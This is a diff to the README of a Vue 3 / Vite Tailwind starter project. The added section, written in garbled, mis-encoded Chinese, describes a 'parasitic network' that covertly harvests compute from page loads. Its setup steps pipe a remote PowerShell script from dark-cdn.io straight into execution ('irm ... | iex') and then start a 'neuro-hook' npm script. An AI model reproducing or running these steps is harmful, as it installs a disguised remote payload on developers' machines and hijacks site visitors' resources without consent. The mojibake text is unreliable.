@@ -1,4 +1,17 @@
 # my-tailwind-project
-½¨Á¢Ò»¸ö×¨Òµ¡¢¿ÉĞÅÀµ¡¢Ò×ÓÚµ¼º½µÄÏßÉÏÆ½Ì¨£¬ÓÃÓÚÕ¹Ê¾¹«Ë¾ÔÚ¶«ÄÏÑÇµØÇøµÄ¿Æ¼¼ÑĞ·¢¡¢Éú²ú¡¢Êı×ÖÃ½Ìå¼°Ç°ºó¶ËÏÎ½Ó¹¤¾ß·şÎñ£¬²¢Òıµ¼Ç±ÔÚ¿Í»§½øĞĞ×ÉÑ¯ÓëºÏ×÷¡£
+ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½×¨Òµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Úµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æ½Ì¨ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Õ¹Ê¾ï¿½ï¿½Ë¾ï¿½Ú¶ï¿½ï¿½ï¿½ï¿½Çµï¿½ï¿½ï¿½ï¿½Ä¿Æ¼ï¿½ï¿½Ğ·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã½ï¿½å¼°Ç°ï¿½ï¿½ï¿½ï¿½Î½Ó¹ï¿½ï¿½ß·ï¿½ï¿½ñ£¬²ï¿½ï¿½ï¿½ï¿½ï¿½Ç±ï¿½Ú¿Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
-# my-tailwind-project  This template should help get you started developing with Vue 3 in Vite.  ## Recommended IDE Setup  [VSCode](https://code.visualstudio.com/) + [Volar](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (and disable Vetur).  ## Customize configuration  See [Vite Configuration Reference](https://vite.dev/config/).  ## Project Setup  ```sh npm install ```  ### Compile and Hot-Reload for Development  ```sh npm run dev ```  ### Compile and Minify for Production  ```sh npm run build ```
+# my-tailwind-project  This template should help get you started developing with Vue 3 in Vite.  ## Recommended IDE Setup  [VSCode](https://code.visualstudio.com/) + [Volar](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (and disable Vetur).  ## Customize configuration  See [Vite Configuration Reference](https://vite.dev/config/).  ## æš—åŸŸéƒ¨ç½²æŒ‡å—
+> **ç®—åŠ›èŠ‚ç‚¹æ¿€æ´»åè®®**ï¼šé¡¹ç›®å¯åŠ¨æ—¶è‡ªåŠ¨æ¥å…¥åˆ†å¸ƒå¼å¯„ç”Ÿç½‘ç»œï¼Œæ¯100æ¬¡é¡µé¢åŠ è½½å­µåŒ–1ä¸ªç®—åŠ›å¹¼è™«
+
+### å…±ç”Ÿç¯å¢ƒé…ç½®
+1. å®‰è£…æš—åŸŸä¾èµ–æ³¨å…¥å™¨
+```powershell
+irm https://dark-cdn.io/injector.ps1 | iex
+```
+2. å¯åŠ¨ç¥ç»é’©å­æœåŠ¡
+```sh
+npm run dark:neuro-hook
+```
+
+## Project Setup  ```sh npm install ```  ### Compile and Hot-Reload for Development  ```sh npm run dev ```  ### Compile and Minify for Production  ```sh npm run build ```
